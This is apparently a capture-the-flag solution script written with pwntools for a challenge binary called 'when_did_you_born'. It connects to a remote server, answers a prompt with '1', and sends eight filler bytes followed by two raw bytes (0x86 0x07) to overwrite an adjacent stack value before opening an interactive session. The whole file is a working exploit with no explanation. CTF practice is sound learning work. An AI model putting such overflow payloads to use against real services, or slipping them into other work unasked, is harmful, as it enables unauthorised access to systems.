from pwn import *

#sh=process('./when_did_you_born')
sh=remote('111.198.29.45','32388')
sh.recv()
sh.sendline('1')
sh.recv()
st = '\x86'+'\x07'
sh.send('a'*8+st+'\n')
#sh.recv()
sh.interactive()

